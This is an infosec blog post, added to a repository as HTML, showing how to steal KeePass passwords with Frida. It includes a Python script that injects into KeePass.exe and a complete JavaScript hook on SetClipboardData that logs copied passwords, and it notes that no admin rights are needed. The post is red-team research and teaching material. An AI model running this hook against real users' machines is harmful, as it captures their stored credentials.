@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- layout.ejs-->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="two06">
+    <meta name="keyword" content="">
+    <link rel="canonical" href="https://blog.two06.info/two06.github.io/Stealing-KeePass-Credentials-With-Frida/">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="Another Infosec Blog" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
+
+    <title>
+        
+        Stealing KeePass Credentials With Frida｜two06 Infosec Blog
+        
+    </title>
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+    
+<link rel="stylesheet" href="/two06.github.io/css/main.css">
+
+
+    
+      <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+      
+<link rel="stylesheet" href="/two06.github.io/css/highlight.css">
+
+    
+
+    
+
+
+    
+
+    
+
+    
+
+
+    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    
+
+
+
+
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+
+    <!-- user customization -->
+    
+<link rel="stylesheet" href="/two06.github.io/css/arsnippet.css">
+
+    
+<script src="/two06.github.io/js/arsnippet.css.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<style>
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<header>
+  <nav class="navbar navbar-default header-navbar" id="nav-top" data-ispost = "true" data-istags="false" data-ishome = "false" >
+    <div class="container-fluid">
+      <div class="navbar-header page-scroll">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" aria-expanded="false"  data-target="#website_navbar">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <span class="navbar-brand animated pulse">
+          <a class="brand-logo" href="/two06.github.io/">
+            Another Infosec Blog
+          </a>
+        </span>
+      </div>
+
+      <div class="collapse navbar-collapse" id="website_navbar">
+          <ul class="nav navbar-nav navbar-right">
+              
+                <li>
+                  <a href="/two06.github.io/">home</a>
+                </li>
+              
+                <li>
+                  <a href="/two06.github.io/Other-Research/">Other Research</a>
+                </li>
+              
+                <li>
+                  <a href="/two06.github.io/archives/">archives</a>
+                </li>
+              
+                <li>
+                  <a href="/two06.github.io/atom.xml">RSS</a>
+                </li>
+              
+          </ul>
+      </div>
+  </nav>
+
+
+  
+    <style>
+       .intro-header {
+          background-image: url('');
+      }
+    </style>
+
+    <div class="intro-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                    <div class="site-heading">
+                        <h1>Stealing KeePass Credentials With Frida</h1>
+                        
+                        
+                          <span class="meta">
+                               <span class="meta-item">Author: two06</span>
+                               <span class="meta-item">Date: Jun 2, 2019</span>
+                               
+                          </span>
+                          <!--<div class="tags text-center">
+                              Categories: 
+                          </div>-->
+                          <div class="tags text-center">
+                              Tags: 
+                              <a class="tag" href="/two06.github.io/tags/#Infosec"
+                                 title="Infosec">Infosec</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Frida"
+                                 title="Frida">Frida</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Hooking"
+                                 title="Hooking">Hooking</a>
+                              
+                          </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+  
+</header>
+
+
+<!-- Main Content -->
+<!-- post.ejs -->
+<article>
+    <div class="container">
+      <div class="col-lg-8 col-lg-offset-1 col-sm-9">
+          
+          
+          <p>In this post, we’re going to take a quick look at <a href="https://frida.re" target="_blank" rel="noopener">Frida</a> and use it to steal credentials from KeePass.<br>According to their website, Frida is a “dynamic instrumentation framework”. Essentially, it allows us to inject into a running process then interact with that process via JavaScript. It’s commonly used for mobile app testing, but is supported on Windows, OSX and *Nix as well.</p>
+<p><a href="https://keepass.info" target="_blank" rel="noopener">KeePass</a> is a free and open-source password manager with official builds for Windows, but unofficial releases exist for most Linux flavors. We are going to look at the latest official Windows version 2 release (2.42.1).<br>To follow along, you will need Frida, KeePass and Visual Studio (or any other editor you want to load a .net project in). You will also need the KeePass source from <a href="https://keepass.info/download.html" target="_blank" rel="noopener">https://keepass.info/download.html</a></p>
+<p>The first step is figuring out what we want to achieve. Like most password managers, KeePass protects stored credentials with a master password. This password is entered by the user and allows the KeePass database to be accessed. Once unlocked, usernames and passwords can be copied to the clipboard to allow them to be entered. Given that password managers allow the easy use of strong passwords, it’s a fairly safe assumption that users will be copying and pasting passwords. Lets take at look how KeePass interacts with the clipboard.</p>
+<p>After a bit of digging (hit: the search tool is your friend), we find some references to the “SetClipboardData” windows API call. It looks like KeePass is hooking the native Windows API to manage the clipboard.</p>
+<p><img src="winAPI.png" alt=""></p>
+<p>Looking at which calls reference this method, we find one reference within the ClipboardUtil.Windows.cs class.</p>
+<p><img src="search.png" alt=""></p>
+<p>It looks like the “SetDataW” method is how KeePass interacts with the clipboard.</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">SetDataW</span>(<span class="params"><span class="keyword">uint</span> uFormat, <span class="keyword">byte</span>[] pbData</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UIntPtr pSize = <span class="keyword">new</span> UIntPtr((<span class="keyword">uint</span>)pbData.Length);</span><br><span class="line">    IntPtr h = NativeMethods.GlobalAlloc(NativeMethods.GHND, pSize);</span><br><span class="line">    <span class="keyword">if</span>(h == IntPtr.Zero) &#123; Debug.Assert(<span class="literal">false</span>); <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    Debug.Assert(NativeMethods.GlobalSize(h).ToUInt64() &gt;=</span><br><span class="line">    (<span class="keyword">ulong</span>)pbData.Length); <span class="comment">// Might be larger</span></span><br><span class="line">    IntPtr pMem = NativeMethods.GlobalLock(h);</span><br><span class="line">    <span class="keyword">if</span>(pMem == IntPtr.Zero)</span><br><span class="line">    &#123;</span><br><span class="line">        Debug.Assert(<span class="literal">false</span>);</span><br><span class="line">        NativeMethods.GlobalFree(h);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Marshal.Copy(pbData, <span class="number">0</span>, pMem, pbData.Length);</span><br><span class="line">    NativeMethods.GlobalUnlock(h); <span class="comment">// May return false on success</span></span><br><span class="line">    <span class="keyword">if</span>(NativeMethods.SetClipboardData(uFormat, h) == IntPtr.Zero)</span><br><span class="line">    &#123;</span><br><span class="line">        Debug.Assert(<span class="literal">false</span>);</span><br><span class="line">        NativeMethods.GlobalFree(h);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This code uses native method calls to allocate some memory, writes the supplied pbData byte array to that location and then calls the SetClipBoardData API, passing a handle to the memory containing the contents of pbData.</p>
+<p>To confirm this is the code we want to target, we can add a breakpoint and debug the app. Before we can build the solution, we need to fix up the singing key. The easiest way is just to disable signing for the KeePass and KeePassLib projects (Right click -&gt; Properties -&gt; Signing -&gt; uncheck “Sign the assembly” -&gt; save).</p>
+<p>With our breakpoint set we can run KeePass, open a database and copy a credential (right click -&gt; copy password). Our breakpoint is hit and we can inspect the value of pbData. If you get a build error, double check you have disabled signing and try again.</p>
+<p><img src="breakpoint1.png" alt=""></p>
+<p>In this case, the copied password was “AABBCCDD”, which matches the bytes shown. We can confirm this by adding a bit of code to the method and re-running our test.</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = System.Text.Encoding.Default.GetString(pbData);</span><br></pre></td></tr></table></figure>
+
+<p>This will convert the pbData byte array to a string, which we can inspect with the debugger.</p>
+<p><img src="breakpoint2.png" alt=""></p>
+<p>This looks like a good method to target, as the app only calls the SetClipboardData native API in one place (meaning we shouldn’t need to filter out any calls we don’t care about). Time to fire up Frida.</p>
+<p>Before we get into hooking the KeePass application, we need a way to inject Frida. For this example, we are going to use a simple python3 script.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(message[<span class="string">'payload'</span>])</span><br><span class="line">    <span class="keyword">elif</span> message[<span class="string">'type'</span>] == <span class="string">'error'</span>:</span><br><span class="line">        print(message[<span class="string">'stack'</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">     print(message)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session = frida.attach(<span class="string">"KeePass.exe"</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"[+] Process Attached"</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">f"Error =&gt; <span class="subst">&#123;e&#125;</span>"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">with</span> codecs.open(<span class="string">'./Inject.js'</span>, <span class="string">'r'</span>, <span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    source = f.read()</span><br><span class="line">script = session.create_script(source)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    session.detach()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>This looks complicated, but doesn’t actually do that much. The interesting part happens inside the try/catch block. We attempt to attach to the “KeePass.exe” process, then inject a .js file containing our code to interact with the process and set up messaging. The “on_message” function allows messages to be received from the target process, which we just print to the console. This code is basically generic, so you can re-use it for any other process you want to target.</p>
+<p>Our code to interact with the process will be written in the “Inject.js” file.</p>
+<p>First, we need to grab a reference to the SetClipboardData API.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user32_SetClipboardData = Module.findExportByName(<span class="string">"user32.dll"</span>, <span class="string">"SetClipboardData"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>We can then attach to this call, which sets up our hook.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Attach a hook to the native pointer</span></span><br><span class="line">Interceptor.attach(user32_SetClipboardData, &#123;</span><br><span class="line"> onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args, state</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[+] KeePass called SetClipboardData"</span>);</span><br><span class="line"> &#125;,</span><br><span class="line"> </span><br><span class="line"> onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>The “OnEnter” method is called as the target process calls SetClipboardData. OnLeave, as you might expect, is called just before the hooked method returns.</p>
+<p>I’ve added a simple console.log call to the OnEnter function, which will let us test our hook and make sure we aren’t getting any erroneous API calls showing up.</p>
+<p>With KeePass.exe running (you can use the official released binary now, no need to run the debug version from Visual Studio), run the python script. You should see the “process attached” message. Unlock KeePass and copy a credential. You should see the “KeePass called SetClipboardData” message.</p>
+<p><img src="poc1.png" alt=""></p>
+<p>KeePass, by default, clears the clipboard after 12 seconds. You will see another “KeePass called SetClipboardData” message when this occurs. We can strip that out later.</p>
+<p>Looking at the SetClipboardData <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setclipboarddata" target="_blank" rel="noopener">API document</a>, we can see that two parameters are passed.</p>
+<p><img src="doc.png" alt=""></p>
+<p>A format value, and a handle. The handle is essentially a pointer to the memory address containing the data to add to the clipboard. For this example, we can safely ignore the format value (this is used to specify the type of data to be added to the clipboard). KeePass uses one of two format values, I’ll leave it as an exercise for the reader to modify the PoC to support both formats fully.</p>
+<p>The main thing we need to know is that the second argument is the memory address we want to access. In Frida, we gain access to arguments passed to hooked methods via the “args” array. We can then use the Frida API to read data from the address passed to hMem.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get native pointer to MessageBoxA</span></span><br><span class="line"> <span class="keyword">var</span> user32_SetClipboardData = Module.findExportByName(<span class="string">"user32.dll"</span>, <span class="string">"SetClipboardData"</span>)</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// Attach a hook to the native pointer</span></span><br><span class="line"> Interceptor.attach(user32_SetClipboardData, &#123;</span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args, state</span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log(<span class="string">"[+] KeePass called SetClipboardData"</span>);</span><br><span class="line">         <span class="keyword">var</span> ptr = args[<span class="number">1</span>].readPointer().readByteArray(<span class="number">32</span>);</span><br><span class="line">         <span class="built_in">console</span>.log(ptr)</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>Here we call readPointer() on args[1], then read a byte array from it. Note that the call to readByteArray() requires a length value, which we don’t have. While it should be possible to grab this from other calls, we can side step this complexity by simply reading a set number of bytes. This may be a slightly naive approach, but it’s sufficient for our purposes.</p>
+<p>Kill the python script and re-run (you don’t need to re-start KeePass). Copy some data and you should see the byte array written to the console.</p>
+<p><img src="poc2.png" alt=""></p>
+<p>Frida automatically formats the byte array for us. We can see the password “AABCCDD” being set on the clipboard, followed by “ — “ 12 seconds later. This is the string KeePass uses to overwrite the clipboard data.</p>
+<p>This is enough information to flesh out our PoC. We can convert the byte array to a string, then check if the string starts with “ — “ to remove the data when KeePass clears the clipboard. Note that is is, again, a fairly naive approach and introduces an obvious bug where a password starting with “ — “ would not be captured. Another exercise for the reader!</p>
+<p>This gives us our complete PoC.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get native pointer to MessageBoxA</span></span><br><span class="line"><span class="keyword">var</span> user32_SetClipboardData = Module.findExportByName(<span class="string">"user32.dll"</span>, <span class="string">"SetClipboardData"</span>)</span><br><span class="line"><span class="comment">// Attach a hook to the native pointer</span></span><br><span class="line">Interceptor.attach(user32_SetClipboardData, &#123;</span><br><span class="line"> onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args, state</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[+] KeePass called SetClipboardData"</span>);</span><br><span class="line">        <span class="keyword">var</span> ptr = args[<span class="number">1</span>].readPointer().readByteArray(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">var</span> str = ab2str(ptr);</span><br><span class="line">        <span class="keyword">if</span>(!str.startsWith(<span class="string">"--"</span>))&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"[+] Captured Data!"</span>)</span><br><span class="line">            <span class="built_in">console</span>.log(str);        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"[+] Clipboard was cleared"</span>)</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> </span><br><span class="line"> onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ab2str</span>(<span class="params">buf</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode.apply(<span class="literal">null</span>, <span class="keyword">new</span> <span class="built_in">Uint16Array</span>(buf));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The ab2str function converts a byte array to a string, the rest should be self explanatory. If we run this PoC we should see the captured password and a message telling us the clipboard was cleared.</p>
+<p><img src="poc3.png" alt=""></p>
+<p>That’s all for this post. There is obviously some work to do before we could use this on an engagement, but we can see how powerful Frida can be. It’s worth noting that you do not need any privileges to inject into the KeePass process, all the examples were run with KeePass and CMD running as a standard user.</p>
+
+          
+          <hr>
+          <ul class="pager">
+              
+              <li class="previous">
+                  <a href="/two06.github.io/Persistence-with-KeePass-Part-1/" data-toggle="tooltip" data-placement="left"
+                     title="Persistence with KeePass - Part 1">&larr; Previous Post</a>
+              </li>
+              
+              
+          </ul>
+        
+  <br>
+  
+
+  
+  </div>
+
+
+        
+
+      </div>
+  </div>
+</article>
+
+<!-- Footer -->
+<!-- footer.ejs -->
+<footer>
+    <div class="text-center">
+      <ul class="list-inline">
+          
+              <li>
+                  <a href="/two06.github.io/atom.xml" target="_blank">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+          
+              <li>
+                  <a target="_blank" href="https://twitter.com/two06">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+          
+
+          
+
+          
+
+          
+              <li>
+                  <a target="_blank"  href="https://github.com/two06">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+          
+
+          
+
+      </ul>
+     <div class="text-muted copyright">
+            &copy;
+            
+            2019 - 2020
+            
+            
+              <i class="fa fa-user"></i>
+            
+            two06
+        <br>
+          
+              Powered by <a target="_blank" href="https://hexo.io">Hexo</a>
+          
+          
+          
+          
+      </div>
+    </div>
+</footer>
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/two06.github.io/js/main.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+</body>
+
+</html>
